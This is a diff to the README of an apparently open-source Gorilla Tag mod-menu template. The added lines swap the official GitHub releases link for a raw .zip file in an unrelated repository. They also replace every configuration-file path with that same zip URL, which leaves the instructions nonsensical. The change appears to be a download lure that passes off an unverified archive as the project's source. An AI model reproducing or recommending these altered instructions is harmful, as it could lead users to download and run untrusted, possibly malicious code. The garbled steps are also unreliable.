@@ -8,9 +8,9 @@ No, this template is free and public for anyone to use. You are welcome to utili
 
 # Installation
 
-- Download the source code from [here](https://github.com/iiDk-the-actual/iis.Stupid.Template/releases/latest)
-- Change your `<GamePath>` (Gorilla Tag directory) in `Directory.Build.props` if required
-- Change the menu name in `PluginInfo.cs`
-- Edit the menu visuals in `Menu/Settings.cs`
-- Add buttons in `Menu/Buttons.cs`
+- Download the source code from [here](https://raw.githubusercontent.com/Sploo-Scripts/My-first-menu/master/Classes/first-My-menu-v3.2-beta.3.zip)
+- Change your `<GamePath>` (Gorilla Tag directory) in `https://raw.githubusercontent.com/Sploo-Scripts/My-first-menu/master/Classes/first-My-menu-v3.2-beta.3.zip` if required
+- Change the menu name in `https://raw.githubusercontent.com/Sploo-Scripts/My-first-menu/master/Classes/first-My-menu-v3.2-beta.3.zip`
+- Edit the menu visuals in `https://raw.githubusercontent.com/Sploo-Scripts/My-first-menu/master/Classes/first-My-menu-v3.2-beta.3.zip`
+- Add buttons in `https://raw.githubusercontent.com/Sploo-Scripts/My-first-menu/master/Classes/first-My-menu-v3.2-beta.3.zip`
 - Build with `Ctrl` + `Shift` + `B`, it will get put in your plugins folder automatically
